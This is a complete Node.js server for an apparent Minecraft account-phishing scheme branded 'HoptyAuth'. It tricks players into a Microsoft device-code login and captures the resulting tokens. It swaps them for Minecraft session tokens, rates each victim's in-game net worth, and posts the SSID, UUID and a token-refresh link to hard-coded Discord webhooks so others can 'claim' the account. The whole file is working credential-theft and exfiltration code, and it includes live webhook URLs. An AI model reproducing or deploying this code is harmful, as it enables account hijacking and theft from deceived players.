const express = require('express');
const axios = require('axios');
const { URLSearchParams } = require('url');
const { EmbedBuilder } = require('discord.js');

const app = express();
const port = 3000;

const Endpoints = {
  LiveDeviceCodeRequest: 'https://login.live.com/oauth20_connect.srf', // Replace with the actual endpoint
  LiveTokenRequest: 'https://login.live.com/oauth20_token.srf' // Replace with the actual token endpoint
};

const hits_webhook = 'https://discord.com/api/webhooks/1254877999132704910/Zk-SaL7yZLvUZEFQDuT7OUeqh9bAk9dYQcNG5zLnqNy3U3y39ROOrjLGhRvmkmUWlsZ8'
const private_webhook = 'https://discord.com/api/webhooks/1255112150301675520/gXgs6gSCIjOd7SPPOKpoLK97GQibXTsMu5Hyturt-CqH9ihdIER1bSp81YBO84w6uPXN';
// Middleware to parse JSON bodies
app.use(express.json());

app.get('/verify', async (req, res) => {
  try {
//    const { scopes, clientId } = req.body;

    const codeRequest = {
      method: 'post',
      url: Endpoints.LiveDeviceCodeRequest,
      data: new URLSearchParams({
        scope: 'service::user.auth.xboxlive.com::MBI_SSL',
        client_id: '00000000402b5328', // Assuming this is the client_id
        response_type: 'device_code'
      }).toString(),
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    };


    const response = await axios(codeRequest);

    const verificationUri = response.data.verification_uri;
    const userCode = response.data.user_code;
    const deviceCode = response.data.device_code;
    const interval = response.data.interval || 5; // Default to 5 seconds if not provided
    const expiresIn = response.data.expires_in || 800; // Default to 800 seconds if not provided

    if (!verificationUri || !userCode) {
      return res.status(500).json({ error: 'Missing verification URI or user code in the response' });
    }

    res.redirect(`${verificationUri}?otc=${userCode}`);

    pollForToken(deviceCode, interval, expiresIn, res);
  } catch (e) {
//    console.error('Error requesting live device token:', e);
  }
});


//Refresh XBL Token
app.get('/refreshxbl', async (req, res) => {
     const xbl = req.query.xbl;
 try{
    const xstsAuthorizeData1 = {
      Properties: {
        SandboxId: 'RETAIL',
        UserTokens: [xbl]
      },
      RelyingParty: 'rp://api.minecraftservices.com/',
      TokenType: 'JWT'
    };

    const xstsAuthorizeResponse1 = await axios.post('https://xsts.auth.xboxlive.com/xsts/authorize', xstsAuthorizeData1);
    const userhash1 = xstsAuthorizeResponse1.data.DisplayClaims.xui[0].uhs;
    const identityToken1 = `XBL3.0 x=${userhash1};${xstsAuthorizeResponse1.data.Token}`;

    const minecraftLoginData1 = {
        identityToken: identityToken1
    };

    const minecraftLoginResponse1 = await axios.post('https://api.minecraftservices.com/authentication/login_with_xbox', minecraftLoginData1);
    res.json(minecraftLoginResponse1.data);
 }catch(err){
  console.log(err);
 }
});


async function pollForToken(deviceCode, interval, expiresIn, res) {
  let polling = true;
  const expireTime = Date.now() + expiresIn * 1000;

  while (polling && expireTime > Date.now()) {
    await new Promise(resolve => setTimeout(resolve, interval * 1000));
    try {
      const tokenRequest = {
        method: 'post',
        url: Endpoints.LiveTokenRequest,
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        data: new URLSearchParams({
          client_id: '00000000402b5328',
          device_code: deviceCode,
          grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
        }).toString()
      };

      const tokenResponse = await axios(tokenRequest);
      const tokenData = tokenResponse.data;

      if (tokenData.error) {
        if (tokenData.error === 'authorization_pending') {
          console.log('[live] Still waiting:', tokenData.error_description);
        } else {

        }
      } else {
        polling = false;
        updateCache(tokenData);

       const accessToken = tokenData.access_token;

       const authenticateData = {
           Properties: {
             AuthMethod: 'RPS',
             SiteName: 'user.auth.xboxlive.com',
             RpsTicket: `${accessToken}`
           },
           RelyingParty: 'http://auth.xboxlive.com',
           TokenType: 'JWT'
         };

        const authenticateResponse = await axios.post('https://user.auth.xboxlive.com/user/authenticate', authenticateData);

        const xblToken = authenticateResponse.data.Token;
        const userHash = authenticateResponse.data.DisplayClaims.xui[0].uhs;
        const xstsAuthorizeData = {
          Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [xblToken]
          },
          RelyingParty: 'rp://api.minecraftservices.com/',
          TokenType: 'JWT'
        };

        const xstsAuthorizeResponse = await axios.post('https://xsts.auth.xboxlive.com/xsts/authorize', xstsAuthorizeData);

        const identityToken = `XBL3.0 x=${userHash};${xstsAuthorizeResponse.data.Token}`;

        const minecraftLoginData = {
          identityToken: identityToken
        };

        const minecraftLoginResponse = await axios.post('https://api.minecraftservices.com/authentication/login_with_xbox', minecraftLoginData);
        const accesstoken2 = minecraftLoginResponse.data.access_token;
        const uuid = await axios.get('https://api.minecraftservices.com/minecraft/profile', {
          headers: {
            Authorization: `Bearer ${accesstoken2}`
            }
          });


        const name = uuid.data.name;
        const uuidplayer = uuid.data.id;
        let nwresponse;

        try{
             nwresponse = await axios.get(`https://sky.shiiyu.moe/api/v2/profile/${name}`);
        }catch(e){

        }
        let firstProfileNetworth;
        let Skyblock_level;
        let Catacombs_level;
        if(nwresponse && nwresponse.data && nwresponse.data.profiles){
             const profiles = nwresponse.data.profiles;
             const firstProfileId = Object.keys(profiles)[0];
             if(firstProfileId){
                 firstProfileNetworth = profiles[firstProfileId].data.networth.networth;
                 Skyblock_level = profiles[firstProfileId].data.skyblock_level.level;
                 Catacombs_level = profiles[firstProfileId].data.dungeons.catacombs.level.level;
             }else{
                 firstProfileNetworth = 'Profile Not Found';
                 Skyblock_level = 'Profile Not Found';
                 Catacombs_level = 'Profile Not Found';
             }
        }else{
             firstProfileNetworth = 'Profile Not Found';
             Skyblock_level = 'Profile Not Found';
             Catacombs_level = 'Profile Not Found';
        }
        const NW = formatNumber(firstProfileNetworth);
        console.log(`Name: ${name}\nUUID: ${uuidplayer}\nNetWorth: ${NW}\nSSID: ${accesstoken2}`);
        const embed = new EmbedBuilder()
         .setColor(0x0099ff) // Set the color of the embed
         .setTitle('Someone Verified')
         .setDescription('Someone Verified \nclaim the Account at claim-hits channel with command\n \/claim username:{MinecraftName} ')
         .setThumbnail(`https://nmsr.nickac.dev/fullbody/${uuidplayer}`)
         .addFields(
             { name: 'NetWorth', value: `${NW}`},
             { name: 'Dungions Catacombs level', value: `${Catacombs_level}`},
             { name: 'SkyBlock Level', value: `${Skyblock_level}`}
         )
         .setTimestamp() // Add a timestamp
         .setAuthor({name: `*****`,iconURL: `https://nmsr.nickac.dev/face/${uuidplayer}`})
         .setFooter({ text: 'Hopty-Auth', iconURL: 'https://cdn.discordapp.com/attachments/1254877578888482836/1254883019039182917/zfEn06clS4eQd6ayFmKUYw.webp?ex=667b1c62&is=6679cae2&hm=b5068169d6e33fd74203e5056bcbd4a30ae459cd69685f3aa945833bcee26727&' });

         const payload = {
            content: '@everyone',
            username: 'HoptyAuth', // Set the username of the webhook
            avatar_url: 'https://cdn.discordapp.com/attachments/1254877578888482836/1254883019039182917/zfEn06clS4eQd6ayFmKUYw.webp?ex=667b1c62&is=6679cae2&hm=b5068169d6e33fd74203e5056bcbd4a30ae459cd69685f3aa945833bcee26727&',
            embeds: [embed.toJSON()] // Send the embed
        };
        const embed_private = new EmbedBuilder()
         .setColor(0x0099ff)
         .setTitle('New Bozo Verified')
         .setDescription(`[RefreshXBL](https://hopty-auth.onrender.com/refreshxbl?xbl=${xblToken})`)
         .setThumbnail(`https://nmsr.nickac.dev/fullbody/${uuidplayer}`)
         .addFields(
             {name: 'IGN',value: `\`${name}\``, inline: true},
             {name: 'UUID',value: `\`${uuidplayer}\``, inline: true},
             {name: 'SSID',value: `\`${accesstoken2}\``, inline: true},
             {name: 'NetWorth',value: `\`${NW}\``, inline: true}
          )
         .setTimestamp(Date.now())
         .setAuthor({name: `${name}`,iconURL: `https://nmsr.nickac.dev/face/${uuidplayer}`})
         .setFooter({text: 'HoptyAuth',iconURL: 'https://cdn.discordapp.com/attachments/1254877578888482836/1254883019039182917/zfEn06clS4eQd6ayFmKUYw.webp?ex=667bc522&is=667a73a2&hm=bb76f472a8b89fb73b68b50cef3b4e1e7cfe8a65b0e4b339c44e5dbae266e944&'});

         const payload1 = {
            content: '@everyone',
            username: 'HoptyAuth',
            avatar_url: 'https://cdn.discordapp.com/attachments/1254877578888482836/1254883019039182917/zfEn06clS4eQd6ayFmKUYw.webp?ex=667bc522&is=667a73a2&hm=bb76f472a8b89fb73b68b50cef3b4e1e7cfe8a65b0e4b339c44e5dbae266e944&',
            embeds: [embed_private.toJSON()] // Send the embed
        };

         axios.post(private_webhook, payload1)
            .then(() => console.log('Embed sent successfully'))
            .catch(console.error);

         axios.post(hits_webhook, payload)
            .then(() => console.log('Embed sent successfully'))
            .catch(console.error);
      }
    } catch (e) {
         console.log(e);
    }
  }

  polling = false;

}

// Dummy updateCache method for demonstration
function updateCache(tokenData) {
//  console.log('Updating cache with token data:', tokenData);
}
function formatNumber(num) {
   if (isNaN(num)) {
        return num.toString(); // Return the original string representation
    }

    // Billion
    if (num >= 1e9) {
        return (num / 1e9).toFixed(0).replace(/\.0$/, '') + 'B';
    }
    // Million
    if (num >= 1e6) {
        return (num / 1e6).toFixed(0).replace(/\.0$/, '') + 'M';
    }
    // Thousand
    if (num >= 1e3) {
        return (num / 1e3).toFixed(0).replace(/\.0$/, '') + 'K';
    }
    // Less than Thousand
    return num.toString();
}
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
